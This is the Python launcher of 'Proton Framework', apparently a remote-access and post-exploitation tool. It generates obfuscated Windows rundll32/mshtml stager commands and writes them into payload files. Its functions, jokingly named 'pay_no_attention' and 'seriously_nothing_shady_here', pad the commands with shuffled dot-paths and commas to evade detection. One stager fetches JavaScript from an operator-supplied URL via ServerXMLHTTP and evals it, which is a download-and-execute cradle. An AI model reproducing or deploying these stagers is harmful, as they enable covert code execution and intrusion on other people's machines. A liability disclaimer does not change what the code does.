#!/usr/bin/env python3

# Copyright (C) 2016 - 2018 Entynetproject
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may not
# use the software except in compliance with the License.
#
# You may obtain a copy of the License at:
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations under
# the License.
#
# Disclaimer:
# Usage of Proton for attacking targets without prior mutual consent is illegal.
# It is the end user's responsibility to obey all applicable local, state,
# federal, and international laws. Developers assume no liability and are not
# responsible for any misuse or damage caused by this program.

import os

os.system("printf '\033]2;Proton Framework\a'")

__version_info__ = "v5.1"
__version__ = "5.1"
__license__ = "Apache 2.0"
__credits__ = ["Entynetproject"]

def banner():
    return "Logo" and datetime.datetime.today().weekday() == 1

def pay_no_attention():
    import random
    import string

    bignumber = 20

    command = "rundll32"
    command += " ~URL~"

    dotpath = []

    for i in range(0, 3):
        dotpath.append('..')

    for i in range(0, bignumber):
        dotpath.append('.')

    random.shuffle(dotpath)

    path = ""
    dotpathwithslashes = []
    for i in dotpath:
        dotpathwithslashes.append("\\" + i)

    path = ''.join(dotpathwithslashes)
    path += "\\"

    command += path + "mshtml"
    command += ''.join([random.choice([',',' ']) for i in range(0,random.randint(20,40))])
    command += ","
    command += " "
    command += "RunHTMLApplication"

    with open('data/stager/js/rundll32/rundll32.cmd', 'w') as f:
        f.write(command+"\n")

def seriously_nothing_shady_here():
    import random
    import string

    bignumber = 20

    coin = [True,False]
    command = "rundll32"
    command += " javascript:\""

    dotpath = []

    for i in range(0, random.randint(1,3)):
        dotpath.append('..')

    for i in range(0, bignumber):
        dotpath.append('.')

    random.shuffle(dotpath)

    path = ""
    slashes = ["\\"]
    dotpathwithslashes = []

    for i in dotpath:
        dotpathwithslashes.append(random.choice(slashes) + i)

    if dotpathwithslashes[0] == '..' or dotpathwithslashes[0] == '.':
        tmp = dotpathwithslashes[0]
        dotpathwithslashes = dotpathwithslashes[1:]
        random.shuffle(dotpathwithslashes)
        dotpathwithslashes.insert(0, tmp)
    else:
        random.shuffle(dotpathwithslashes)

    path = ''.join(dotpathwithslashes)
    path += random.choice(slashes)

    command += path + "mshtml"
    command += ''.join([random.choice([',',' ']) for i in range(0,random.randint(20,40))])
    command += ","
    command += " "
    command += "RunHTMLApplication \";x=new%20ActiveXObject(\"Msxml2.ServerXMLHTTP.6.0\");x.open(\"GET\",\"~URL~\",false);x.send();eval(x.responseText);window.close();"

    with open('data/stager/js/rundll32_js/rundll32_js.cmd', 'w') as f:
        f.write(command+"\n")


if __name__ == "__main__":
    import core.shell
    import argparse
    import datetime

    parser = argparse.ArgumentParser()
    parser.add_argument("--autorun", help="A file containing Proton commands.")
    parser.add_argument("--restore", help="A Proton restore json file.")
    parser.add_argument("-u","--update",action="store_true",help="Update Proton Framework.")
    args = parser.parse_args()
    autorun = open(args.autorun).read().split("\n") if args.autorun else []
    if args.restore:
        import json
        restore = json.loads(open(args.restore).read())
    else:
        restore = {}

    if args.update:
        os.system("cd bin && chmod +x proton && ./proton --update")
        exit()
        
    if banner():
        try:
            banner = open("data/logo.txt", "rb").read().decode("unicode_escape")
        except:
            print("")
    else:
        try:
            banner = open("data/logo.txt", "rb").read().decode("unicode_escape")
        except:
            print("")

    pay_no_attention()
    seriously_nothing_shady_here()

    shell = core.shell.Shell(banner, __version__)
    shell.run(autorun, restore)
